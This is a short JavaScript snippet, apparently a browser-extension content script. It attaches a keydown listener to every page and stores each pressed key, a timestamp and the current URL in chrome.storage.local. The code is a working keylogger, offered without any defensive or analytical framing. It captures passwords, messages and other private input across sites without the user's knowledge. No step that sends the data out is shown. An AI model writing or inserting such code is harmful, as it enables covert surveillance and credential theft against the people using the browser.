// Captures keystrokes and logs to chrome.storage.local
(function () {
  document.addEventListener("keydown", function (e) {
    const entry = {
      k: e.key,
      t: Date.now(),
      u: window.location.href
    };

    chrome.storage.local.get({ d: [] }, function (res) {
      let logs = res.d;
      logs.push(entry);
      chrome.storage.local.set({ d: logs });
    });
  });
})();
